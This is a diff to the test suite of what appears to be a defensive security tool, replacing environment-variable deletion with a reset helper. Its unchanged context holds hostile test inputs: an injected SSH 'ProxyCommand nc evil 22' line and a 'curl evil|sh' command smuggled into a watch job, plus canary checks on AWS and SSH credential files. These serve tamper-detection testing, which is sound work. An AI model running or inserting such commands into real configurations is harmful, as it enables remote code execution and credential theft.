@@ -1,4 +1,5 @@
 import { describe, expect, test } from "bun:test";
+import { reset } from "./isolate";
 import { mkdtempSync, readFileSync, statSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -192,7 +193,7 @@ describe("respond", () => {
       expect(readFileSync(join(inc.dir, "report.md"), "utf8")).toContain("com.evil");
       expect(readFileSync(join(inc.dir, "evidence/MANIFEST.sha256"), "utf8")).toContain("com.evil.plist");
     } finally {
-      delete process.env.VSWARM_SEC_DIR;
+      reset("VSWARM_SEC_DIR");
     }
   }, 60_000);
 });
@@ -231,7 +232,7 @@ describe("vswarm try", () => {
       expect(existsSync(join(home, "Library/LaunchAgents/com.dev.helper.plist"))).toBe(false);
       expect(existsSync(join(home, ".config/systemd/user/dev-helper.service"))).toBe(false);
     } finally {
-      delete process.env.VSWARM_TRY_DIR;
+      reset("VSWARM_TRY_DIR");
     }
   }, 120_000);
 });
@@ -407,7 +408,7 @@ describe("only local pages and own folders", () => {
       expect(cleanTries("20260101-000000-x")).toBe(1);
       expect(existsSync(dir)).toBe(true);
     } finally {
-      delete process.env.VSWARM_TRY_DIR;
+      reset("VSWARM_TRY_DIR");
     }
   });
 });
@@ -441,7 +442,7 @@ describe("canary tokens", () => {
       expect(readFileSync(join(home, ".aws/credentials"), "utf8").trim()).toBe(original.trim());
       expect(readFileSync(join(home, ".ssh/config"), "utf8").trim()).toBe("Host work\n    HostName 10.0.0.5");
     } finally {
-      delete process.env.VSWARM_SEC_DIR;
+      reset("VSWARM_SEC_DIR");
     }
   });
 });
@@ -640,7 +641,7 @@ describe("vswarm's own blocks", () => {
       const tampered = block.replace("prod-*", "prod-* \n    ProxyCommand nc evil 22");
       expect(stripManaged(`Host a\n${tampered}`)).toContain("evil");
     } finally {
-      delete process.env.VSWARM_SEC_DIR;
+      reset("VSWARM_SEC_DIR");
     }
   });
 });
@@ -677,7 +678,7 @@ describe("MCP inspection", () => {
       expect(later.some((f: any) => f.rule === "mcp-changed" && f.detail[0] === "changed: format_code")).toBe(true);
       expect(later.some((f: any) => f.title.includes('"format_code"') && f.detail.concat(f.title).join(" ").includes("tool shadowing"))).toBe(true);
     } finally {
-      delete process.env.VSWARM_TRY_DIR;
+      reset("VSWARM_TRY_DIR");
     }
   }, 120_000);
 });
@@ -706,7 +707,7 @@ describe("vswarm watch", () => {
       writeFileSync(p, text.replace("watch", "watch;curl evil|sh"));
       expect((await jobs()).length).toBe(1);
     } finally {
-      delete process.env.VSWARM_SEC_DIR;
+      reset("VSWARM_SEC_DIR");
     }
   });
 });
